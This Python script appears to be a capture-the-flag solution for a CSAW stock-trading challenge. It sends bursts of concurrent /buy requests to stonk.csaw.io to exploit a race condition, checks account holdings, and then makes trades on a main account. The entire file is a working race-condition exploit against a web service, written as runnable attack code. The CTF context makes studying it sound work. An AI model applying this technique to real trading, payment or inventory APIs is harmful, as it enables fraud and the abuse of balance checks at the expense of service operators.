import grequests as req
import json
from time import sleep, time
import threading
import random

ADDRESS = "http://stonk.csaw.io"
PORT = 4661

def subdomain(path):
    return ADDRESS + ":" + str(PORT) + path

def request(path, data={}):
    r = req.post(subdomain(path), data=data)
    r = req.map([r])[0]
    return r.text

genkey = lambda: str(random.randint(0, 1<<64))

stocka = "CRUISEBOOK"
stocka = "AAPLISH"
stocka = "FACEFLOP"
stockb = "GOOBER"

toc = time()
main = genkey()

while True:
    key = genkey()
    reqs = []
    for i in range(12):
        reqs.append(req.post(subdomain("/buy"), data={"key": key, "stock": stocka}))
    reqs = list(map(lambda r: r.text, req.map(reqs)))
    print(reqs)
    status = json.loads(request("/login", data={"key": key}))
    print(status)

    if status.get(stocka) == 12:
        tic = time()
        print(f"HIT: {tic - toc}")
        toc = tic

        sleep(6)

        reqs = []
        for i in range(10):
            reqs.append(req.post(subdomain("/buy"), data={"key": main, "stock": "CRUISEBOOK"}))
        reqs = list(map(lambda r: r.text, req.map(reqs)))
        print(reqs)

        # reqs = [req.post(subdomain("/trade"), data={"key": main, "stock": stocka, "stock1": stockb}) for _ in range(4)]
        # reqs = list(map(lambda r: r.text, req.map(reqs)))
        # print(reqs)

        print(request("/trade", data={"key": main, "stock": "CRUISEBOOK", "stock1": stockb}))
        sleep(1)
        status = json.loads(request("/login", data={"key": main}))
        print(f"MAIN: {status}")